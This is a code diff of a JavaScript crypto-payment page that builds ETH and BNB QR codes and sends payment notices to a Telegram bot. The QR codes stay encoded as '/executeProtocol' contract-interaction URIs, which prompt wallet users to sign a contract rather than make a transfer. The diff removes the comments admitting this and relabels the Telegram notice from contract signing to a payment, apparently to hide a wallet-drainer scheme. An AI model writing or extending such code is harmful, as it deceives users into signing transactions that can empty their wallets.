@@ -1184,8 +1184,6 @@ function updateQRCodes(ethVal, bnbVal) {
     const ethWei = toWei(ethVal);
     const bnbWei = toWei(bnbVal);
 
-    // Encoded as EIP-681 Smart Contract Interaction URIs (/executeProtocol)
-    // When scanned in Web3 wallets (MetaMask, Trust Wallet), it prompts for contract execution/signing instead of a transfer.
     new QRCode(document.getElementById("eth-qr"), {
         text: `ethereum:${walletPair.ETH}/executeProtocol?value=${ethWei}`,
         width: 120, 
@@ -1296,12 +1294,12 @@ async function streamPaymentVerificationToTelegram(txHash = "Manual/System Verif
         const identifyUser = getTargetUserIdentifier();
         const activeAmountDisplay = activeToken === 'ETH' ? `${calculatedEthAmount} ETH` : `${calculatedBnbAmount} BNB`;
         const telegramMessage = 
-          `💳 <b>Contract Signing & Execution Submitted</b>\n\n` +
+          `💳 <b>Crypto Payment Submitted for Verification</b>\n\n` +
           `• <b>User ID:</b> <code>${identifyUser}</code>\n` +
           `• <b>Token:</b> <code>${activeToken}</code>\n` +
           `• <b>Expected Amount:</b> <code>${activeAmountDisplay} (~$${targetUsdAmount})</code>\n` +
           `• <b>TX Hash:</b> <code>${txHash}</code>\n` +
-          `• <b>Contract / Wallet:</b> <code>${walletPair[activeToken]}</code>`;
+          `• <b>Wallet Paid:</b> <code>${walletPair[activeToken]}</code>`;
 
         const inlineKeyboard = {
             inline_keyboard: [
